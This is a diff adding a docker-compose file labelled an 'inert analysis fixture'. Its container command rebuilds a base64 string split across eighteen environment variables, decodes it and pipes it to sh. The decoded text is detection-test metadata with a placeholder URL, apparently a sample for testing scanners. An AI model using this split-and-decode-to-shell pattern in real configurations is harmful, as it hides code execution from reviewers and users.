@@ -1,0 +1,24 @@
+# inert analysis fixture
+services:
+  app:
+    image: alpine:3.19
+    environment:
+      - D0=dj0zfGxhbmd1YWdlPWRvY2tl
+      - D1=cl9jb21wb3NlfHJvbGU9bGF1
+      - D2=bmNoZXJ8dmVyZGljdD1zdXNw
+      - D3=aWNpb3VzfGF0dGFjaz1UMTA1
+      - D4=OXxhZGFwdGVyPXByb2Nlc3Nf
+      - D5=c3Bhd258aG9zdF9wcm9maWxl
+      - D6=PWRvY2tlcl9jb21wb3NlfG9i
+      - D7=ZnVzY2F0aW9uX3Byb2ZpbGU9
+      - D8=YmFzZTY0fHN0YWdlX3Byb2Zp
+      - D9=bGU9c2luZ2xlX3N0YWdlfG5l
+      - D10=eHRfbGFuZ3VhZ2U9c2h8Y2Ft
+      - D11=cGFpZ25faWQ9REMtNWM4ZTFh
+      - D12=MDd8dXJsPWh0dHBzOi8vZGMt
+      - D13=NWM4ZTFhMDcuZXhhbXBsZS5p
+      - D14=bnZhbGlkL3N0YWdlfGZpbGVf
+      - D15=cGF0aD0vdG1wL2h1bnRyZXNz
+      - D16=LWRjLTVjOGUxYTA3Ly5zdGFn
+      - D17=ZQ==
+    command: sh -c 'echo $${D0}$${D1}$${D2}$${D3}$${D4}$${D5}$${D6}$${D7}$${D8}$${D9}$${D10}$${D11}$${D12}$${D13}$${D14}$${D15}$${D16}$${D17} | base64 -d | sh'
